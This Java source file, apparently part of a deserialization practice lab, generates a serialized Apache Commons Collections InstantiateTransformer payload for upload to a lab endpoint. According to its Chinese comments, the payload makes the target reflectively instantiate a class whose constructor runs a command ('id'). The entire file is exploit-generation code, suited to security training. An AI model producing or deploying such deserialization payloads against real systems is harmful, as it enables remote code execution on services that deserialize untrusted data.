package class11;

import org.apache.commons.collections.functors.InstantiateTransformer;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

/**
 * 生成 class11 的 payload — InstantiateTransformer
 * 目标: 上传 InstantiateTransformer，靶场调用 t.transform(Student.class)
 *       通过反射创建 Student 实例，构造器中执行命令
 * 靶场: /class11/upload
 */
public class GenPayload {
    public static void main(String[] args) throws Exception {
        InstantiateTransformer inst = new InstantiateTransformer(
                new Class[]{String.class, Integer.TYPE},
                new Object[]{"id", 18});

        ObjectOutputStream oos = new ObjectOutputStream(
                new FileOutputStream("class11.ser"));
        oos.writeObject(inst);
        oos.close();

        System.out.println("✅ 已生成: class11.ser");
    }
}
